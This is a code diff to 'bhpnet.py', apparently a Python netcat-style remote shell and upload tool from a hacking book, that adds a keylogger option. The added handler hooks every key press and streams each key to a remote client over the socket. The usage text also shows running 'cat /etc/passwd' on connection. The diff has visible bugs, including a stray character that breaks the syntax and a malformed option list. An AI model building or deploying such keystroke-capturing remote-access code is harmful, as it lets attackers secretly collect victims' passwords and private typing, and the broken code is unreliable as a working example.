@@ -5,12 +5,14 @@ import socket
 import getopt
 import threading
 import subprocess
+import keyboard
 
 
 # define some global variables
 listen             = False
 command            = False
 upload             = False
+key                = False
 execute            = ""
 target             = ""
 upload_destination = ""
@@ -31,11 +33,41 @@ def run_command(command):
         # send the output back to the client
         return output
 
+def keylogger_handler(client_socket):
+    try:
+        client_socket.send("[*] Keylogger started. Press CTRL+C to stop.\r\n")
+        
+        # Function to send keys to client
+        def on_key_press(event):
+            try:
+                # Send the key press to the client
+                key_data = f"Key: {event.name}\r\n"
+                client_socket.send(key_data)
+            except:
+                # If sending fails, stop the keylogger
+                keyboard.unhook_all()
+                return False
+        
+        # Register the key press handler
+        keyboard.on_press(on_key_press)
+        
+        # Keep the thread running
+        while True:
+            pass
+            
+    except KeyboardInterrupt:
+        keyboard.unhook_all()
+        client_socket.send("[*] Keylogger stopped.\r\n")
+    except:
+        keyboard.unhook_all()
+        client_socket.send("[*] Keylogger error.\r\n")w
+
 # this handles incoming client connections
 def client_handler(client_socket):
         global upload
         global execute
         global command
+        global key
 
         # check for upload
         if len(upload_destination):
@@ -72,6 +104,9 @@ def client_handler(client_socket):
                 output = run_command(execute)
 
                 client_socket.send(output)
+
+        if key: 
+                keylogger_handler(client_socket)
 
 
         # now we go into another loop if a command shell was requested
@@ -172,6 +207,7 @@ def usage():
         print "-l --listen                - listen on [host]:[port] for incoming connections"
         print "-e --execute=file_to_run   - execute the given file upon receiving a connection"
         print "-c --command               - initialize a command shell"
+        print "-k --key                   - initialize a key logger"
         print "-u --upload=destination    - upon receiving connection upload a file and write to [destination]"
         print
         print
@@ -179,6 +215,7 @@ def usage():
         print "bhpnet.py -t 192.168.0.1 -p 5555 -l -c"
         print "bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"
         print "bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
+        print "bhpnet.py -t 192.168.0.1 -p 5555 -l -k"
         print "echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135"
         sys.exit(0)
 
@@ -188,6 +225,7 @@ def main():
         global port
         global execute
         global command
+        global key
         global upload_destination
         global target
 
@@ -196,7 +234,7 @@ def main():
 
         # read the commandline options
         try:
-                opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:",["help","listen","execute","target","port","command","upload"])
+                opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:k",["help","listen","execute","target","port","command","upload, key"])
         except getopt.GetoptError as err:
                 print str(err)
                 usage()
@@ -217,6 +255,8 @@ def main():
                         target = a
                 elif o in ("-p", "--port"):
                         port = int(a)
+                elif o in ("-k", "--key"):
+                        key = True
                 else:
                         assert False,"Unhandled Option"
 
